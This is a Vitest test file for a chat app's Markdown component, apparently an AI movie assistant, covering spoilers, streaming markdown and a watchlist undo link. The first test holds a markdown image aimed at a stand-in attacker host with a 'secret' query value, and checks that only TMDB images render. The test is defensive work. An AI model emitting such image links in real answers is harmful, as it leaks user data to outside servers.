import { fireEvent, render, screen, waitFor } from '@testing-library/react';
import { describe, expect, it, vi } from 'vitest';

import { api } from '../../lib/api';
import Markdown, { sealMarkdownDelimiters } from '../Markdown';

vi.mock('../../lib/api', () => ({
  api: vi.fn().mockResolvedValue({ ok: true }),
  safeExternalUrl: (url) => (url.startsWith('https://') ? url : null),
  userFacingError: (error) => error?.message || 'Request failed.',
}));

describe('Markdown', () => {
  it('renders only TMDB images from model text, so an answer cannot make the browser call another server', () => {
    const { container } = render(
      <Markdown content={'Poster ![Arrival](https://image.tmdb.org/t/p/w200/a.jpg) and ![leak](https://evil.example/c?d=secret)'} />,
    );
    const images = [...container.querySelectorAll('img')].map((img) => img.getAttribute('src'));
    expect(images).toEqual(['https://image.tmdb.org/t/p/w200/a.jpg']);
    expect(screen.getByText('leak')).toBeInTheDocument();
  });

  it('renders tagged spoilers as interactive redactions', () => {
    render(<Markdown content="The reveal is <spoiler>the detective was the patient</spoiler>." />);

    const spoiler = screen.getByRole('button', { name: 'Reveal spoiler' });
    expect(spoiler).toHaveClass('spoiler-text');
    expect(spoiler).not.toHaveClass('revealed');
    fireEvent.click(spoiler);

    expect(screen.getByRole('button', { name: 'Hide spoiler' })).toHaveClass('revealed');
    expect(screen.getByText(/the detective was the patient/)).toBeInTheDocument();
  });

  it('shows HTML tags and bracket citations a model wrote as the markdown they mean', () => {
    expect(sealMarkdownDelimiters('<b>Dune</b> is long<br>and <i>slow</i> 【2†source】')).toBe(
      '**Dune** is long  \nand _slow_ [2]',
    );
    expect(sealMarkdownDelimiters('run <code>npm test</code>')).toBe('run `npm test`');
  });

  it('seals incomplete markdown delimiters during streaming', () => {
    expect(sealMarkdownDelimiters('```python\nprint("hello")')).toBe(
      '```python\nprint("hello")\n```',
    );
    expect(sealMarkdownDelimiters('**unfinished emphasis')).toBe(
      '**unfinished emphasis**',
    );
  });

  it('renders the block still being written as markdown, with its open bold closed', () => {
    // It used to show raw "**unfinished" in a different size until the block completed.
    const { rerender, container } = render(
      <Markdown content={'**finished**\n\n1. **unfinished'} isStreaming />,
    );

    expect(screen.getByText('finished').tagName).toBe('STRONG');
    expect(screen.getByText('unfinished').tagName).toBe('STRONG');
    expect(container.querySelector('.markdown-streaming-tail ol')).not.toBeNull();
    expect(container.textContent).not.toContain('**');

    rerender(<Markdown content={'**finished**\n\n1. **unfinished** item'} isStreaming={false} />);

    expect(screen.getByText('unfinished').tagName).toBe('STRONG');
    expect(container.querySelector('.markdown-streaming-tail')).toBeNull();
  });

  it('shows a single line break in an answer as a line break', () => {
    const { container } = render(
      <Markdown content={'- **Memento** (2000) — 113 min\n  A man with short-term memory loss.'} />,
    );
    const item = container.querySelector('li');
    expect(item.querySelector('br')).not.toBeNull();
    expect(item.textContent).toMatch(/113 min\n?A man with/);
  });

  it('restores a guest watchlist removal through the guest undo endpoint', async () => {
    render(<Markdown content="Removed **The Example**. [Undo](Grace://guest-watchlist/undo/123)" />);

    fireEvent.click(screen.getByRole('button', { name: 'Undo' }));

    await waitFor(() => expect(api).toHaveBeenCalledWith(
      '/guest/watchlist/123/undo',
      { method: 'POST' },
    ));
    expect(await screen.findByRole('button', { name: 'Restored' })).toBeDisabled();
  });
});
